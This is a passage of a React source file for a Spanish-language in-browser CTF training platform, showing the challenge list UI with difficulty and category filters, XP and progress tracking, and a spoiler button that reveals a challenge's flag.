          {resultado==="fail" && <div style={{marginTop:10,background:"#1a0505",border:"1px solid #dc2626",borderRadius:8,padding:"10px 14px",color:"#f87171",fontSize:13}}>❌ Flag incorrecta. Revisa los pasos o pide una pista.</div>}
        </div>
      ) : (
        <div style={{background:"#052e16",border:"1px solid #16a34a",borderRadius:12,padding:20,marginBottom:12,textAlign:"center"}}>
          <div style={{fontSize:28,marginBottom:6}}>🏆</div>
          <div style={{color:"#4ade80",fontWeight:700,fontSize:14}}>{reto.badge}</div>
          <div style={{color:"#166534",fontSize:12,marginTop:4}}>+{reto.xp} XP ganados</div>
        </div>
      )}

      {/* Spoiler */}
      <button onClick={() => setSpoiler(p=>!p)}
        style={{width:"100%",background:"transparent",border:"1px solid #1e1e2e",color:"#444",borderRadius:8,padding:"9px",fontSize:12,cursor:"pointer",fontFamily:"'Inter',sans-serif"}}>
        {spoiler?"🙈 Ocultar solución":"👁 Ver solución (spoiler)"}
      </button>
      {spoiler && (
        <div style={{marginTop:8,background:"#0f0005",border:"1px solid #3b0d0d",borderRadius:8,padding:"12px 14px"}}>
          <div style={{color:"#666",fontSize:10,marginBottom:4}}>FLAG:</div>
          <code style={{color:"#f87171",fontFamily:"monospace",fontSize:13,wordBreak:"break-all"}}>{reto.flag}</code>
        </div>
      )}
    </div>
  );
}

// ─── MAIN ───────────────────────────────────────────────────
export default function Labs({ doneLabs=[], onComplete }) {
  const [vista, setVista] = useState("lista");
  const [retoActivo, setRetoActivo] = useState(null);
  const [filtro, setFiltro] = useState("Todos");
  const [filtrocat, setFiltrocat] = useState("Todas");
  const [completados, setCompletados] = useState(doneLabs);

  const dificultades = ["Todos","Fácil","Medio","Duro"];
  const categorias = ["Todas",...new Set(RETOS.map(r=>r.categoria))];

  const filtrados = RETOS.filter(r => {
    const matchDif = filtro==="Todos" || r.dificultad===filtro;
    const matchCat = filtrocat==="Todas" || r.categoria===filtrocat;
    return matchDif && matchCat;
  });

  const totalXP = completados.reduce((acc,id) => {
    const r = RETOS.find(x=>x.id===id);
    return acc + (r?r.xp:0);
  }, 0);

  const handleCompletar = (id, xp) => {
    if (!completados.includes(id)) {
      setCompletados(p=>[...p,id]);
      if (onComplete) onComplete(id,xp);
    }
  };

  if (vista==="detalle" && retoActivo) return (
    <div style={{minHeight:"100vh",background:"#080810",color:"#fff",fontFamily:"'Inter',sans-serif",padding:"24px 20px"}}>
      <RetoDetalle reto={retoActivo} completado={completados.includes(retoActivo.id)}
        onVolver={() => {setVista("lista");setRetoActivo(null);}}
        onCompletar={handleCompletar}/>
    </div>
  );

  return (
    <div style={{minHeight:"100vh",background:"#080810",color:"#fff",fontFamily:"'Inter',sans-serif"}}>
      {/* Header */}
      <div style={{borderBottom:"1px solid #1e1e2e",padding:"24px 20px 18px",background:"linear-gradient(180deg,#0d0d1f,#080810)"}}>
        <div style={{maxWidth:900,margin:"0 auto"}}>
          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",flexWrap:"wrap",gap:10,marginBottom:14}}>
            <div>
              <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:3}}>
                <span style={{fontSize:22}}>⚗️</span>
                <h1 style={{fontSize:22,fontWeight:800,margin:0,background:"linear-gradient(90deg,#fff,#888)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}}>
                  Labs CTF
                </h1>
              </div>
              <p style={{color:"#444",fontSize:11,margin:0}}>100% en el navegador — sin VMs, desde cualquier dispositivo</p>
            </div>
            <div style={{display:"flex",gap:16}}>
              <div style={{textAlign:"center"}}>
                <div style={{color:"#4ade80",fontSize:16,fontWeight:800}}>{completados.length}/{RETOS.length}</div>
                <div style={{color:"#444",fontSize:10}}>Completados</div>
              </div>
              <div style={{textAlign:"center"}}>
                <div style={{color:"#fbbf24",fontSize:16,fontWeight:800}}>{totalXP}</div>
                <div style={{color:"#444",fontSize:10}}>XP ganados</div>
              </div>
            </div>
          </div>

          {/* Progreso */}
          <div style={{height:3,background:"#1e1e2e",borderRadius:2,overflow:"hidden",marginBottom:14}}>
            <div style={{height:"100%",width:`${(completados.length/RETOS.length)*100}%`,background:"linear-gradient(to right,#00ff9d,#3b82f6)",borderRadius:2,transition:"width 0.5s"}}/>
          </div>

          {/* Filtro dificultad */}
          <div style={{display:"flex",gap:6,flexWrap:"wrap",marginBottom:8}}>
            {dificultades.map(d => {
              const col = d==="Todos"?{text:"#888",border:"#1e1e2e",bg:"#0f0f1a"}:DCOL[d];
              return (
                <button key={d} onClick={() => setFiltro(d)} style={{
                  background:filtro===d?(d==="Todos"?"#fff":col.bg):"#0f0f1a",
                  border:`1px solid ${filtro===d?(d==="Todos"?"#fff":col.border):"#1e1e2e"}`,
                  color:filtro===d?(d==="Todos"?"#080810":col.text):"#555",
                  borderRadius:20,padding:"4px 12px",fontSize:11,cursor:"pointer",
                  fontWeight:filtro===d?700:400,transition:"all 0.2s",fontFamily:"'Inter',sans-serif",
                }}>
                  {d==="Fácil"?"🟢":d==="Medio"?"🟡":d==="Duro"?"🔴":"⚡"} {d}
                </button>
              );
            })}
          </div>

          {/* Filtro categoría */}
          <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
            {categorias.map(c => (
              <button key={c} onClick={() => setFiltrocat(c)} style={{
                background:filtrocat===c?"#ffffff15":"transparent",
                border:`1px solid ${filtrocat===c?"#ffffff30":"#1e1e2e"}`,
                color:filtrocat===c?"#fff":"#555",
                borderRadius:20,padding:"3px 10px",fontSize:10,cursor:"pointer",
                transition:"all 0.2s",fontFamily:"'Inter',sans-serif",
              }}>
                {c}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Grid */}
      <div style={{maxWidth:900,margin:"0 auto",padding:"20px"}}>
        <div style={{color:"#444",fontSize:11,marginBottom:14}}>
          {filtrados.length} reto{filtrados.length!==1?"s":""} encontrados
        </div>
        <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(240px,1fr))",gap:12}}>
          {filtrados.map(r => (
            <RetoCard key={r.id} reto={r} completado={completados.includes(r.id)}
              onAbrir={() => {setRetoActivo(r);setVista("detalle");}}/>
          ))}
        </div>
      </div>
    </div>
  );
}
